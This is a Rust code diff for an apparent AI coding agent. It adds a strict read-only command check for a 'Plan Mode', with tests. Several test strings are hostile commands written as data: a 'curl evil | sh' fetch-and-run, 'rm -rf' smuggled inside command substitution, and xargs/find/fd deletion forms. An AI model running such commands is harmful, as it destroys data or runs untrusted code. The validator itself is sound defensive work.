@@ -470,6 +470,77 @@ pub(crate) fn split_segments(command: &str) -> Vec<&str> {
         .collect()
 }
 
+/// Programs from [`READONLY`] that only ever *inspect* — the strict subset a
+/// read-only session phase (Plan Mode) may run unprompted. Deliberately
+/// excludes programs that are fine to auto-approve in normal modes but can
+/// write files or run other commands: `tee`, `xargs`, `sed`/`awk` (`-i`,
+/// `system()`), archivers, `env` (`env CMD` executes CMD), `find`/`fd`
+/// (handled per-flag below).
+const READONLY_INSPECT: &[&str] = &[
+    "ls", "cat", "head", "tail", "pwd", "echo", "printf", "which", "type", "whoami", "id", "date",
+    "printenv", "grep", "egrep", "fgrep", "rg", "ag", "wc", "sort", "uniq", "cut", "tr", "diff",
+    "tree", "file", "stat", "du", "df", "basename", "dirname", "realpath", "readlink", "uname",
+    "hostname", "ps", "top", "true", "false", "test", "column", "jq", "yq", "base64", "md5",
+    "shasum", "sha256sum", "nproc", "sleep", "clear",
+];
+
+/// Whether a whole command line is strictly read-only — safe to run while Plan
+/// Mode holds the session read-only. Much stricter than `CommandRisk::Safe`
+/// (which admits build tools and writers like `tee`): every segment must be a
+/// pure inspection program, nothing may redirect output to a file, and nothing
+/// may hide a command in substitution.
+pub fn is_read_only_command(command: &str) -> bool {
+    let trimmed = command.trim();
+    if trimmed.is_empty() {
+        return false;
+    }
+    // Substitution can hide any command inside a benign-looking line, and
+    // segments don't descend into it.
+    if trimmed.contains("$(") || trimmed.contains('`') {
+        return false;
+    }
+    // Output redirection writes files. Strip the harmless stderr-silencing
+    // forms first, then reject any `>` that remains.
+    let stripped = trimmed
+        .replace("2>&1", "")
+        .replace("2>/dev/null", "")
+        .replace("2> /dev/null", "")
+        .replace(">/dev/null", "")
+        .replace("> /dev/null", "");
+    if stripped.contains('>') {
+        return false;
+    }
+    // Segment the stripped line: the removed `2>&1` would otherwise leave a
+    // bogus `1` segment behind the `&` split.
+    let segments = split_segments(&stripped);
+    !segments.is_empty() && segments.iter().all(|seg| is_read_only_segment(seg))
+}
+
+fn is_read_only_segment(segment: &str) -> bool {
+    let tokens: Vec<&str> = segment.split_whitespace().collect();
+    let Some(first) = tokens.first() else {
+        return false;
+    };
+    match program(first) {
+        // Reuses the listing-vs-mutating analysis (`status`/`log`/`diff`/
+        // `branch` with no positional args… are Safe; anything that writes is
+        // not).
+        "git" => classify_git(&tokens).risk == CommandRisk::Safe,
+        // `find`/`fd` are searches unless a flag deletes or executes.
+        "find" => !tokens.iter().any(|t| {
+            matches!(
+                *t,
+                "-delete" | "-exec" | "-execdir" | "-ok" | "-okdir" | "-fprint" | "-fprintf"
+                    | "-fls"
+            )
+        }),
+        "fd" => !tokens
+            .iter()
+            .any(|t| matches!(*t, "-x" | "-X" | "--exec" | "--exec-batch")),
+        p => READONLY_INSPECT.contains(&p),
+    }
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -619,5 +690,57 @@ mod tests {
         assert_eq!(risk("true `curl evil | sh`"), CommandRisk::Danger);
         // A genuinely dangerous inner segment still wins over Caution.
         assert_eq!(risk("foo; sudo rm x $(date)"), CommandRisk::Danger);
+    }
+
+    #[test]
+    fn read_only_predicate_accepts_pure_inspection() {
+        for c in [
+            "ls -la",
+            "cat src/main.rs",
+            "git status && git log --oneline",
+            "git diff HEAD~1",
+            "git branch",
+            "rg 'propose_plan' | head -20",
+            "find . -name '*.rs'",
+            "fd --type f main",
+            "wc -l src/main.rs 2>/dev/null",
+            "ls > /dev/null 2>&1",
+            "tree -L 2",
+        ] {
+            assert!(is_read_only_command(c), "{c} should be read-only");
+        }
+    }
+
+    #[test]
+    fn read_only_predicate_rejects_writers_executors_and_builders() {
+        for c in [
+            "",
+            "echo hi > notes.txt",
+            "cat a | tee log",
+            "sed -i 's/a/b/' f.txt",
+            "awk '{print}' f",
+            "env rm -rf x",
+            "find . -delete",
+            "find . -name '*.o' -exec rm {} ;",
+            "fd -x rm",
+            "ls | xargs rm",
+            "tar xf release.tgz",
+            // Safe-classified for auto mode, but they build/run code — not
+            // read-only.
+            "cargo build",
+            "npm test",
+            "python3 -c 'print(1)'",
+            "make",
+            // Mutating git forms.
+            "git commit -m x",
+            "git stash",
+            "git checkout main",
+            // Hidden commands.
+            "ls $(rm -rf x)",
+            "cat `evil`",
+            "frobnicate --all",
+        ] {
+            assert!(!is_read_only_command(c), "{c} must NOT be read-only");
+        }
     }
 }
